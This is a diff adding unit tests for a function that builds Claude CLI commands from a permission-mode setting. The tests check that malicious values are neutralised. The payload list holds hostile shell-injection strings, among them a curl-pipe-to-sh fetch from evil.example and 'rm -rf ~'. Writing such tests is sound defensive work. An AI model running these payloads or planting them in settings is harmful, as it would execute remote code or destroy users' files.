@@ -1,9 +1,11 @@
 import { describe, it, expect } from 'vitest';
 import {
+  buildClaudeCommand,
   escapeForDoubleQuotes,
   PromptContext,
   PROMPT_TEMPLATES,
 } from '../../commands/context-menu-utils';
+import { PermissionMode } from '../../types';
 
 describe('escapeForDoubleQuotes', () => {
   it('escapes backslashes', () => {
@@ -142,5 +144,61 @@ describe('PROMPT_TEMPLATES', () => {
       expect(result).toContain('some selected text');
       expect(result).not.toContain('surrounding context');
     });
+  });
+});
+
+describe('buildClaudeCommand', () => {
+  it('emits no flag for the default mode', () => {
+    expect(buildClaudeCommand('Explain this', 'default')).toBe('claude "Explain this"');
+  });
+
+  it('emits the acceptEdits flag', () => {
+    expect(buildClaudeCommand('Explain this', 'acceptEdits')).toBe(
+      'claude --permission-mode acceptEdits "Explain this"',
+    );
+  });
+
+  it('emits the bypassPermissions flag', () => {
+    expect(buildClaudeCommand('Explain this', 'bypassPermissions')).toBe(
+      'claude --dangerously-skip-permissions "Explain this"',
+    );
+  });
+
+  // VS Code does not enforce a setting's declared `enum` at read time, so a repository's
+  // .vscode/settings.json can put an arbitrary string in contextMenu.permissionMode. That
+  // string must never reach the shell command line.
+  describe('rejects out-of-union values instead of interpolating them', () => {
+    const payloads = [
+      '; touch /tmp/pwned; #',
+      '&& curl -s https://evil.example/x | sh',
+      '$(id)',
+      '`id`',
+      '| tee /tmp/leak',
+      'acceptEdits; rm -rf ~',
+      '\n echo injected',
+      '',
+    ];
+
+    for (const payload of payloads) {
+      it(`neutralises ${JSON.stringify(payload)}`, () => {
+        const cmd = buildClaudeCommand('Explain this', payload as PermissionMode);
+        expect(cmd).toBe('claude "Explain this"');
+        expect(cmd).not.toContain(payload.trim() || '\u0000');
+      });
+    }
+  });
+
+  it('never emits a flag string outside the fixed set', () => {
+    const allowed = ['', ' --permission-mode acceptEdits', ' --dangerously-skip-permissions'];
+    for (const mode of ['default', 'acceptEdits', 'bypassPermissions', 'nonsense', '; id']) {
+      const cmd = buildClaudeCommand('P', mode as PermissionMode);
+      const flag = cmd.slice('claude'.length, cmd.length - ' "P"'.length);
+      expect(allowed).toContain(flag);
+    }
+  });
+
+  it('leaves the escaped prompt intact', () => {
+    const prompt = escapeForDoubleQuotes('cost is $5 and `cmd`');
+    expect(buildClaudeCommand(prompt, 'default')).toBe('claude "cost is \\$5 and \\`cmd\\`"');
   });
 });
